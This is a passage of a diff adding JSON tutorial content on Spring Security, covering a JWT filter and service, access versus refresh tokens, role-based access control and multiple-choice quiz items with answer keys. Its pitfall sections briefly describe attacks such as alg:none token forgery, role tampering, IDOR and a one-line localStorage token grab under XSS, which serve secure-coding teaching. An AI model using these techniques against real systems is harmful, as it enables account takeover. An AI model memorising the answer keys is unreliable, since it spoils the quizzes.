(authHeader == null || !authHeader.startsWith(\"Bearer \")) {\n            filterChain.doFilter(request, response);\n            return;\n        }\n        \n        // Extract token (remove \"Bearer \" prefix)\n        final String jwt = authHeader.substring(7);\n        final String username = jwtService.extractUsername(jwt);\n        \n        // If username extracted and not already authenticated\n        if (username != null && \n            SecurityContextHolder.getContext().getAuthentication() == null) {\n            \n            UserDetails userDetails = userDetailsService\n                .loadUserByUsername(username);\n            \n            // Validate token\n            if (jwtService.isTokenValid(jwt, userDetails)) {\n                // Create authentication token\n                UsernamePasswordAuthenticationToken authToken = \n                    new UsernamePasswordAuthenticationToken(\n                        userDetails,\n                        null,\n                        userDetails.getAuthorities()\n                    );\n                \n                authToken.setDetails(\n                    new WebAuthenticationDetailsSource()\n                        .buildDetails(request)\n                );\n                \n                // Set authentication in context\n                SecurityContextHolder.getContext()\n                    .setAuthentication(authToken);\n            }\n        }\n        \n        filterChain.doFilter(request, response);\n    }\n}",
+              "language": "java"
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "JWT Service Implementation",
+              "content": "Token generation and validation:",
+              "code": "import io.jsonwebtoken.Claims;\nimport io.jsonwebtoken.Jwts;\nimport io.jsonwebtoken.io.Decoders;\nimport io.jsonwebtoken.security.Keys;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.stereotype.Service;\n\nimport javax.crypto.SecretKey;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Function;\n\n@Service\npublic class JwtService {\n\n    @Value(\"${jwt.secret}\")\n    private String secretKey;  // At least 256 bits for HS256\n    \n    @Value(\"${jwt.expiration}\")\n    private long jwtExpiration;  // e.g., 86400000 (24 hours)\n\n    // Generate token with just user details\n    public String generateToken(UserDetails userDetails) {\n        return generateToken(new HashMap<>(), userDetails);\n    }\n\n    // Generate token with extra claims\n    public String generateToken(\n            Map<String, Object> extraClaims,\n            UserDetails userDetails) {\n        \n        return Jwts.builder()\n            .claims(extraClaims)\n            .subject(userDetails.getUsername())\n            .issuedAt(new Date(System.currentTimeMillis()))\n            .expiration(new Date(System.currentTimeMillis() + jwtExpiration))\n            .signWith(getSignInKey())\n            .compact();\n    }\n\n    // Validate token\n    public boolean isTokenValid(String token, UserDetails userDetails) {\n        final String username = extractUsername(token);\n        return username.equals(userDetails.getUsername()) \n            && !isTokenExpired(token);\n    }\n\n    // Extract username from token\n    public String extractUsername(String token) {\n        return extractClaim(token, Claims::getSubject);\n    }\n\n    // Extract any claim\n    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {\n        final Claims claims = extractAllClaims(token);\n        return claimsResolver.apply(claims);\n    }\n\n    private Claims extractAllClaims(String token) {\n        return Jwts.parser()\n            .verifyWith(getSignInKey())\n            .build()\n            .parseSignedClaims(token)\n            .getPayload();\n    }\n\n    private boolean isTokenExpired(String token) {\n        return extractExpiration(token).before(new Date());\n    }\n\n    private Date extractExpiration(String token) {\n        return extractClaim(token, Claims::getExpiration);\n    }\n\n    private SecretKey getSignInKey() {\n        byte[] keyBytes = Decoders.BASE64.decode(secretKey);\n        return Keys.hmacShaKeyFor(keyBytes);\n    }\n}\n\n// application.properties:\n// jwt.secret=dGhpcyBpcyBhIHNlY3JldCBrZXkgdGhhdCBpcyBsb25nIGVub3VnaA==\n// jwt.expiration=86400000",
+              "language": "java"
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Access Tokens vs Refresh Tokens",
+              "content": "Production JWT systems use TWO tokens:\n\nACCESS TOKEN:\n- Short-lived (15 minutes - 1 hour)\n- Contains user info, roles\n- Sent with every API request\n- If stolen, limited damage window\n\nREFRESH TOKEN:\n- Long-lived (7-30 days)\n- Used ONLY to get new access tokens\n- Stored more securely (httpOnly cookie)\n- Can be revoked server-side\n\nFLOW:\n1. Login -> Get access token + refresh token\n2. Use access token for API calls\n3. Access token expires\n4. Send refresh token to /api/auth/refresh\n5. Get new access token\n6. Continue API calls\n\nWHY TWO TOKENS?\n- Access tokens are stateless (no DB lookup)\n- But can't be revoked once issued\n- Short expiration limits damage\n- Refresh tokens CAN be revoked (stored in DB)\n- User can \"logout everywhere\" by revoking refresh tokens"
+            },
+            {
+              "type": "WARNING",
+              "title": "JWT Security Pitfalls",
+              "content": "MISTAKE 1: Weak Secret Key\n// BAD: Short, predictable secret\njwt.secret=secret123\n\n// GOOD: Long, random, base64-encoded\njwt.secret=dGhpcyBpcyBhIHZlcnkgbG9uZyBhbmQgc2VjdXJlIHNlY3JldA==\n// At least 256 bits for HS256, 384 for HS384, 512 for HS512\n\nMISTAKE 2: Storing Sensitive Data in Payload\n// BAD: Password, SSN, credit card in token\n{\"password\": \"secret\", \"ssn\": \"123-45-6789\"}\n\n// Payload is BASE64 ENCODED, not encrypted!\n// Anyone with token can decode and read it\n\nMISTAKE 3: No Expiration\n// BAD: Token valid forever\n.expiration(null)  // Never expires!\n\n// GOOD: Short expiration\n.expiration(new Date(now + 15 * 60 * 1000))  // 15 minutes\n\nMISTAKE 4: Algorithm Confusion\n// Attacker sends: {\"alg\": \"none\"}\n// Some libraries accept unsigned tokens!\n// ALWAYS verify algorithm matches expected\n\nMISTAKE 5: localStorage XSS Vulnerability\n// If attacker has XSS, they can steal token:\ndocument.localStorage.getItem('token');\n\n// Consider httpOnly cookies for token storage"
+            }
+          ],
+          "challenges": [
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-4-mc-1",
+              "title": "JWT Structure",
+              "description": "Understanding JWT components",
+              "question": "Which JWT component prevents an attacker from modifying the payload (e.g., changing roles from USER to ADMIN)?",
+              "options": [
+                "Header - specifies the encryption algorithm",
+                "Payload - contains the user claims",
+                "Signature - cryptographic proof of integrity",
+                "Base64 encoding - obscures the content"
+              ],
+              "correctAnswer": 2,
+              "explanation": "The signature is created by hashing (header + payload) with a secret key. If an attacker modifies the payload, they can't create a valid signature without the secret. When the server validates, it recalculates the signature and compares - modified tokens fail validation. Base64 is encoding, not security.",
+              "difficulty": "advanced"
+            },
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-4-mc-2",
+              "title": "Token Strategy",
+              "description": "Understanding access and refresh tokens",
+              "question": "Why use short-lived access tokens (15 min) with long-lived refresh tokens (7 days) instead of just one long-lived access token?",
+              "options": [
+                "Short tokens are smaller and faster to transmit",
+                "Short access tokens limit damage if stolen; refresh tokens can be revoked server-side",
+                "Refresh tokens provide better encryption",
+                "Short tokens don't need signatures"
+              ],
+              "correctAnswer": 1,
+              "explanation": "Access tokens are stateless - once issued, they can't be revoked until they expire. Short expiration limits the window of abuse if stolen. Refresh tokens are stored server-side and CAN be revoked (logout, password change, suspicious activity). This balances security (short access token lifetime) with UX (user doesn't re-login constantly).",
+              "difficulty": "advanced"
+            }
+          ]
+        },
+        {
+          "id": "security-lesson-5",
+          "title": "Lesson S.5: Role-Based Access Control",
+          "moduleId": "module-security",
+          "order": 5,
+          "estimatedMinutes": 35,
+          "difficulty": "advanced",
+          "contentSections": [
+            {
+              "type": "THEORY",
+              "title": "Beyond Simple Authentication",
+              "content": "Authentication answers: \"Who are you?\"\nAuthorization answers: \"What can you do?\"\n\nSIMPLE AUTHORIZATION:\n- Authenticated vs Anonymous\n- All logged-in users have same access\n\nROLE-BASED ACCESS CONTROL (RBAC):\n- Users have ROLES (Admin, Manager, User)\n- Roles have PERMISSIONS\n- Resources require specific roles\n\nExample Organization:\n\nAdmin Role:\n- Manage users\n- Access all data\n- System configuration\n\nManager Role:\n- View reports\n- Manage team members\n- Edit department data\n\nUser Role:\n- View own data\n- Edit own profile\n- Submit requests\n\nBenefits:\n- Principle of least privilege\n- Easy to audit (who can do what)\n- Simple to update (change role, not individual permissions)"
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Roles vs Authorities in Spring Security",
+              "content": "Spring Security has two concepts:\n\nROLES:\n- Prefixed with ROLE_ internally\n- Represent job functions\n- Coarse-grained\n\n.hasRole(\"ADMIN\")  // Checks for ROLE_ADMIN authority\n.hasAnyRole(\"ADMIN\", \"MANAGER\")\n\nAUTHORITIES:\n- Fine-grained permissions\n- No prefix convention\n- Flexible naming\n\n.hasAuthority(\"user:read\")\n.hasAuthority(\"user:write\")\n.hasAuthority(\"ROLE_ADMIN\")  // Same as hasRole(\"ADMIN\")\n\nBest Practice:\n\n// User entity\npublic class User {\n    private Set<Role> roles;  // ADMIN, MANAGER, USER\n}\n\n// Role entity\npublic class Role {\n    private String name;\n    private Set<Permission> permissions;  // user:read, user:write\n}\n\n// Grant both roles AND permissions as authorities\npublic Collection<? extends GrantedAuthority> getAuthorities() {\n    Set<SimpleGrantedAuthority> authorities = new HashSet<>();\n    \n    // Add roles\n    roles.forEach(role -> \n        authorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role.getName())));\n    \n    // Add permissions\n    roles.forEach(role ->\n        role.getPermissions().forEach(permission ->\n            authorities.add(new SimpleGrantedAuthority(permission.getName()))));\n    \n    return authorities;\n}"
+            },
+            {
+              "type": "THEORY",
+              "title": "Method-Level Security",
+              "content": "URL-based security isn't always enough:\n\n@Service\npublic class UserService {\n    \n    public User getUser(Long id) {\n        // Anyone authenticated can call this method\n        // But should manager only see their team?\n        // Should users only see themselves?\n    }\n}\n\nMethod security provides fine-grained control:\n\n@Configuration\n@EnableMethodSecurity  // Enable method-level security\npublic class SecurityConfig { }\n\nNow use annotations on methods:\n\n@PreAuthorize(\"hasRole('ADMIN')\")\npublic void deleteUser(Long id) { }\n\n@PreAuthorize(\"hasAuthority('report:view')\")\npublic Report generateReport() { }\n\n@PostAuthorize(\"returnObject.owner == authentication.name\")\npublic Document getDocument(Long id) { }\n\n@PreFilter and @PostFilter for collections."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "@PreAuthorize Expressions",
+              "content": "SpEL (Spring Expression Language) for complex authorization:",
+              "code": "@Service\npublic class DocumentService {\n\n    // Simple role check\n    @PreAuthorize(\"hasRole('ADMIN')\")\n    public void deleteAllDocuments() { }\n\n    // Multiple roles (OR)\n    @PreAuthorize(\"hasRole('ADMIN') or hasRole('MANAGER')\")\n    public List<Document> getAllDocuments() { }\n\n    // Permission-based\n    @PreAuthorize(\"hasAuthority('document:write')\")\n    public Document createDocument(Document doc) { }\n\n    // Access method parameters\n    @PreAuthorize(\"#userId == authentication.principal.id\")\n    public User getUser(Long userId) { }\n\n    // Complex expression - only own documents or admin\n    @PreAuthorize(\"#document.ownerId == authentication.principal.id \" +\n                  \"or hasRole('ADMIN')\")\n    public void updateDocument(@P(\"document\") Document document) { }\n\n    // Check returned value (runs AFTER method)\n    @PostAuthorize(\"returnObject.owner == authentication.name \" +\n                   \"or hasRole('ADMIN')\")\n    public Document getDocument(Long id) {\n        return documentRepository.findById(id).orElseThrow();\n    }\n\n    // Filter collections - only return permitted items\n    @PostFilter(\"filterObject.department == authentication.principal.department \" +\n                \"or hasRole('ADMIN')\")\n    public List<Document> searchDocuments(String query) {\n        return documentRepository.search(query);  // Filter applied after\n    }\n\n    // Custom security method\n    @PreAuthorize(\"@documentSecurity.canAccess(authentication, #id)\")\n    public Document getSecureDocument(Long id) { }\n}\n\n// Custom security bean\n@Component(\"documentSecurity\")\npublic class DocumentSecurityService {\n    \n    public boolean canAccess(Authentication auth, Long documentId) {\n        // Complex business logic\n        Document doc = documentRepository.findById(documentId).orElse(null);\n        if (doc == null) return false;\n        \n        User user = (User) auth.getPrincipal();\n        return doc.getOwnerId().equals(user.getId()) ||\n               doc.getSharedWith().contains(user.getId()) ||\n               user.getRoles().contains(\"ADMIN\");\n    }\n}",
+              "language": "java"
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Controller-Level Security",
+              "content": "Apply security at the controller level:\n\n@RestController\n@RequestMapping(\"/api/admin\")\n@PreAuthorize(\"hasRole('ADMIN')\")\npublic class AdminController {\n    \n    // All methods require ADMIN role\n    \n    @GetMapping(\"/users\")\n    public List<User> getUsers() { }  // ADMIN required\n    \n    @DeleteMapping(\"/users/{id}\")\n    public void deleteUser(@PathVariable Long id) { }  // ADMIN required\n    \n    // Override for specific method\n    @GetMapping(\"/stats\")\n    @PreAuthorize(\"hasAnyRole('ADMIN', 'MANAGER')\")\n    public Stats getStats() { }  // ADMIN or MANAGER\n}\n\n// Combine URL and method security\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        return http\n            .authorizeHttpRequests(auth -> auth\n                // Coarse-grained URL security\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                .requestMatchers(\"/api/**\").authenticated()\n            )\n            // Method security provides fine-grained control\n            .build();\n    }\n}\n\nBEST PRACTICE:\n- URL security for broad access patterns\n- Method security for business-logic authorization\n- Use both for defense in depth"
+            },
+            {
+              "type": "THEORY",
+              "title": "Implementing RBAC in Database",
+              "content": "Store roles and permissions in database:\n\n// User entity\n@Entity\npublic class User {\n    @Id @GeneratedValue\n    private Long id;\n    \n    private String username;\n    private String password;\n    \n    @ManyToMany(fetch = FetchType.EAGER)\n    @JoinTable(name = \"user_roles\",\n        joinColumns = @JoinColumn(name = \"user_id\"),\n        inverseJoinColumns = @JoinColumn(name = \"role_id\"))\n    private Set<Role> roles = new HashSet<>();\n}\n\n// Role entity\n@Entity\npublic class Role {\n    @Id @GeneratedValue\n    private Long id;\n    \n    private String name;  // ADMIN, MANAGER, USER\n    \n    @ManyToMany(fetch = FetchType.EAGER)\n    @JoinTable(name = \"role_permissions\",\n        joinColumns = @JoinColumn(name = \"role_id\"),\n        inverseJoinColumns = @JoinColumn(name = \"permission_id\"))\n    private Set<Permission> permissions = new HashSet<>();\n}\n\n// Permission entity\n@Entity\npublic class Permission {\n    @Id @GeneratedValue\n    private Long id;\n    \n    private String name;  // user:read, user:write, report:view\n}\n\n// Database tables:\n// users: id, username, password\n// roles: id, name\n// permissions: id, name\n// user_roles: user_id, role_id\n// role_permissions: role_id, permission_id\n\nThis allows runtime role/permission management without code changes."
+            },
+            {
+              "type": "WARNING",
+              "title": "Authorization Security Pitfalls",
+              "content": "MISTAKE 1: Client-Side Only Authorization\n// Frontend hides admin button\n{isAdmin && <AdminButton />}\n\n// But API is unprotected!\n// Attacker directly calls /api/admin/delete\n\nFIX: ALWAYS enforce on server side.\n\nMISTAKE 2: Role in JWT Without Verification\n// Token contains roles\n{\"roles\": [\"USER\"]}\n\n// User modifies to:\n{\"roles\": [\"ADMIN\"]}\n\n// If signature not verified, user is now admin!\n\nFIX: Validate signature; consider fetching roles from DB.\n\nMISTAKE 3: Insecure Direct Object Reference (IDOR)\n// Get document by ID\n@GetMapping(\"/documents/{id}\")\npublic Document getDocument(@PathVariable Long id) {\n    return documentRepo.findById(id);  // No ownership check!\n}\n\n// User A can access User B's documents by guessing IDs\n\nFIX: Always verify ownership or permission.\n@PostAuthorize(\"returnObject.owner == authentication.name\")\n\nMISTAKE 4: Missing Authorization on Modifications\n// Checks permission to view\n@PreAuthorize(\"hasAuthority('doc:read')\")\npublic Document getDoc(Long id) { }\n\n// Forgets to check permission to modify!\npublic void updateDoc(Document doc) { }  // No check!\n\nFIX: Apply appropriate authorization to ALL sensitive methods."
+            }
+          ],
+          "challenges": [
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-5-mc-1",
+              "title": "@PreAuthorize vs @PostAuthorize",
+              "description": "Understanding when to use each annotation",
+              "question": "When should you use @PostAuthorize instead of @PreAuthorize?",
+              "options": [
+                "When you need better performance",
+                "When authorization depends on the returned object's properties",
+                "When checking multiple roles",
+                "When using JWT authentication"
+              ],
+              "correctAnswer": 1,
+              "explanation": "@PostAuthorize runs AFTER the method executes, so you can access the return value. Use it when authorization depends on the returned object (e.g., 'user can only see their own document'). @PreAuthorize runs before and is preferred when you don't need the return value, as it fails fast without executing potentially expensive operations.",
+              "difficulty": "advanced"
+            },
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-5-mc-2",
+              "title": "Roles vs Authorities",
+              "description": "Understanding Spring Security's role and authority concepts",
+              "question": "In Spring Security, what is the relationship between hasRole('ADMIN') and hasAuthority('ROLE_ADMIN')?",
+              "options": [
+                "hasRole is for URL security, hasAuthority is for method security",
+                "They are equivalent - hasRole adds the ROLE_ prefix automatically",
+                "hasAuthority provides encryption, hasRole does not",
+                "hasRole checks database, hasAuthority checks JWT"
+              ],
+              "correctAnswer": 1,
+              "explanation": "hasRole('ADMIN') and hasAuthority('ROLE_ADMIN') are equivalent. Spring Security automatically prefixes 'ROLE_' when using hasRole(). This is a convention - roles use the prefix, while authorities (fine-grained permissions like 'user:read') typically don't. Use hasRole for job functions, hasAuthority for specific permissions.",
+              "difficulty": "advanced"
+            }
+          ]
+        }
+      ]
     }
   ]
 }
